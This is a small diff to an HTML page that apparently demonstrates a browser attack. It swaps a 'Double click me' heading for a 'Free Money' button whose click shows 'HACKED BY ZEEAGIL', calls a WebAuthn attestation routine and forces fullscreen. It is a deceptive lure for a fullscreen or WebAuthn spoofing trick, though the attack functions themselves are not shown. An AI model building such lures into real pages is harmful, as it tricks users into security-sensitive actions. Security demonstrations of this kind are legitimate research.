@@ -18,11 +18,11 @@
   </style>
 </head>
 <body>
-    <h1>Double click me</h1>
+  <button id="fullscreenAndWebAuthnButton">Free Money</button>
   <div id="hackedMessage">HACKED BY ZEEAGIL</div>
 
   <script>
-    document.addEventListener('dblclick', function() {
+    document.getElementById('fullscreenAndWebAuthnButton').addEventListener('click', function() {
       document.getElementById('hackedMessage').style.display = 'block';
       performWebAuthnAttestation();
       setTimeout(launchFullscreen, 300);
